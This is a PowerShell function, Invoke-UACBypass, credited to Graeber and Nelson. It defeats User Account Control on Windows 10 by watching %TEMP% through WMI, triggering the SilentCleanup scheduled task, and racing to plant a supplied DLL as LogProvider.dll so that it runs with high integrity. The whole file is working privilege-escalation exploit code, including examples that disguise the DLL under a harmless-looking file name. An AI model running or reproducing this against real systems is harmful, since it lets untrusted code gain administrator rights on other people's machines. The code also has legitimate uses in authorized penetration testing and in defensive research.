function Invoke-UACBypass {
<#
.SYNOPSIS

Bypasses UAC on Windows 10 by abusing the SilentCleanup task to win a race condition, allowing for a DLL hijack without a privileged file copy.

Author: Matthew Graeber (@mattifestation), Matt Nelson (@enigma0x3)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.PARAMETER DllPath

Specifies the path to the DLL you want executed in a high integrity context. Be mindful of the architecture of the DLL. It must match that of %SystemRoot%\System32\Dism\LogProvider.dll.

.EXAMPLE

Invoke-UACBypass -DllPath C:\Users\TestUser\Desktop\Win10UACBypass\PrivescTest.dll

.EXAMPLE

Invoke-UACBypass -DllPath C:\Users\TestUser\Desktop\TotallyLegit.txt -Verbose

The DllPath can have any extension as long as the file itself is a DLL.
#>

    [CmdletBinding()]
    [OutputType([System.IO.FileInfo])]
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateScript({ Test-Path $_ })]
        $DllPath
    )

    $PrivescAction = {
        $ReplacementDllPath = $Event.MessageData.DllPath
        # The newly created GUID folder
        $DismHostFolder = $EventArgs.NewEvent.TargetInstance.Name
        
        $OriginalPreference = $VerbosePreference

        # Force -Verbose to display in the event
        if ($Event.MessageData.VerboseSet -eq $True) {
            $VerbosePreference = 'Continue'
        }

        Write-Verbose "DismHost folder created in $DismHostFolder"
        Write-Verbose "$ReplacementDllPath to $DismHostFolder\LogProvider.dll"
            
        try {
            $FileInfo = Copy-Item -Path $ReplacementDllPath -Destination "$DismHostFolder\LogProvider.dll" -Force -PassThru -ErrorAction Stop
        } catch {
            Write-Warning "Error copying file! Message: $_"
        }

        # Restore the event preference
        $VerbosePreference = $OriginalPreference

        if ($FileInfo) {
            # Trigger Wait-Event to return and indicate success.
            New-Event -SourceIdentifier 'DllPlantedSuccess' -MessageData $FileInfo
        }
    }

    $VerboseSet = $False
    if ($PSBoundParameters['Verbose']) { $VerboseSet = $True }

    $MessageData = New-Object -TypeName PSObject -Property @{
        DllPath = $DllPath
        VerboseSet = $VerboseSet # Pass the verbose preference to the scriptblock since
                                 # event scriptblocks will not automatically honor -Verbose.
    }

    $TempDrive = $Env:TEMP.Substring(0,2)

    # Trigger the DLL dropper with the following conditions:
    #  1) A directory is created - i.e. new Win32_Directory instance
    #  2) The directory created is created under %TEMP%
    #  3) The directory name is in the form of a GUID
    $TempFolderCreationEvent = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA `"Win32_Directory`" AND TargetInstance.Drive = `"$TempDrive`" AND TargetInstance.Path = `"$($Env:TEMP.Substring(2).Replace('\', '\\'))\\`" AND TargetInstance.FileName LIKE `"________-____-____-____-____________`""
    
    $TempFolderWatcher = Register-WmiEvent -Query $TempFolderCreationEvent -Action $PrivescAction -MessageData $MessageData

    # We need to jump through these hoops to properly capture stdout and stderr of schtasks.
    $StartInfo = New-Object Diagnostics.ProcessStartInfo
    $StartInfo.FileName = 'schtasks'
    $StartInfo.Arguments = '/Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I'
    $StartInfo.RedirectStandardError = $True
    $StartInfo.RedirectStandardOutput = $True
    $StartInfo.UseShellExecute = $False
    $Process = New-Object Diagnostics.Process
    $Process.StartInfo = $StartInfo
    $null = $Process.Start()
    $Process.WaitForExit()
    $Stdout = $Process.StandardOutput.ReadToEnd().Trim()
    $Stderr = $Process.StandardError.ReadToEnd().Trim()

    if ($Stderr) {
        Unregister-Event -SubscriptionId $TempFolderWatcher.Id
        throw "SilentCleanup task failed to execute. Error message: $Stderr"
    } else {
        if ($Stdout.Contains('is currently running')) {
            Unregister-Event -SubscriptionId $TempFolderWatcher.Id
            Write-Warning 'SilentCleanup task is already running. Please wait until the task has completed.'
        }

        Write-Verbose "SilentCleanup task executed successfully. Message: $Stdout"
    }

    $PayloadExecutedEvent = Wait-Event -SourceIdentifier 'DllPlantedSuccess' -Timeout 10

    Unregister-Event -SubscriptionId $TempFolderWatcher.Id

    if ($PayloadExecutedEvent) {
        Write-Verbose 'UAC bypass was successful!'

        # Output the file info for the DLL that was planted
        $PayloadExecutedEvent.MessageData

        $PayloadExecutedEvent | Remove-Event
    } else {
        # The event timed out.
        Write-Error 'UAC bypass failed. The DLL was not planted in its target.'
    }
}
